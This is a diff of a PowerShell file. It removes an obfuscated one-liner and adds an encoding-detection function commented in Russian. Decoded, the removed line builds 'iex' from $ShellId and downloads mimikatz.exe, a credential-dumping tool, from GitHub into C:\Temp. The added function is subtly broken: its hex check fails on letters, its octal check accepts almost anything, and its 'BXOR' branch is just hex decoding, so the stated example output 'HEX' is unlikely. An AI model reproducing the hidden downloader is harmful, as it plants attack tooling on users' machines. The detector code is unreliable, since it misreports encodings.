@@ -1,2 +1,56 @@
 # code-powershell
- & ( $shEllID[1]+$SHeLlid[13]+'x')( " $( Set  'oFs'  '' ) " + [stRINg]('73U110>118b111a107a101a45t87R101R98!82d101t113d117R101!115!116>32d34X104p116X116d112!115t58!47d47X103X105a116d104a117U98d46>99p111a109X47X80b97U114a114b111>116X83U101d99!47p109>105U109R105b107X97b116p122p47d98p108!111t98X47t109U97b115!116X101>114U47!87d105t110X51t50d47a109d105d109t105p107X97d116R122b46R101p120>101t34>32b45U79a117!116b70d105p108t101R32R34b67!58X92t84R101b109!112!92X109U105!109R105t107b97X116b122X46U101>120>101a34'-spLit 'a'-SPlIT'U'-sPlit 'R' -Split'b'-SPliT'd' -splIt 'p'-SPlit'!' -spLiT 'X' -splIt'>'-SpLiT't'| ForeaCH-ObJeCT{([cHAr] [inT]$_) }) +"$( SeT-vArIaBle  'oFS' ' ')" )
+function Detect-Encoding {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$inputString
+    )
+
+    # Проверяем, содержит ли строка только символы ASCII
+    if ($inputString -match '^[\x00-\x7F]+$') {
+        Write-Output "ASCII"
+        return
+    }
+
+    # Проверяем, является ли строка HEX-кодированной
+    try {
+        [byte[]] $hexBytes = $inputString -split "(?<=\G..)(?!$)"
+        [System.Text.Encoding]::ASCII.GetString($hexBytes)
+        Write-Output "HEX"
+        return
+    }
+    catch {}
+
+    # Проверяем, является ли строка OCTAL-кодированной
+    try {
+        $octalBytes = [System.Text.Encoding]::ASCII.GetBytes(([regex]::Replace($inputString, '(\d{3})', { [char][int]$args[0].Value })))
+        [System.Text.Encoding]::ASCII.GetString($octalBytes)
+        Write-Output "OCTAL"
+        return
+    }
+    catch {}
+
+    # Проверяем, является ли строка BINARY-кодированной
+    try {
+        $binaryBytes = [System.Text.Encoding]::ASCII.GetBytes(([regex]::Replace($inputString, '(\d{8})', { [char][Convert]::ToByte($args[0].Value, 2) })))
+        [System.Text.Encoding]::ASCII.GetString($binaryBytes)
+        Write-Output "BINARY"
+        return
+    }
+    catch {}
+
+    # Проверяем, является ли строка BXOR-кодированной
+    try {
+        $bxorBytes = [System.Text.Encoding]::ASCII.GetBytes(([regex]::Replace($inputString, '(\w{2})', { [char][Convert]::ToByte($args[0].Value, 16) })))
+        [System.Text.Encoding]::ASCII.GetString($bxorBytes)
+        Write-Output "BXOR"
+        return
+    }
+    catch {}
+
+    Write-Output "Unknown encoding"
+}
+
+# Пример использования
+$string = "48656C6C6F2C20776F726C6421" # HEX-кодированная строка
+Detect-Encoding -inputString $string # Выводит "HEX"
+
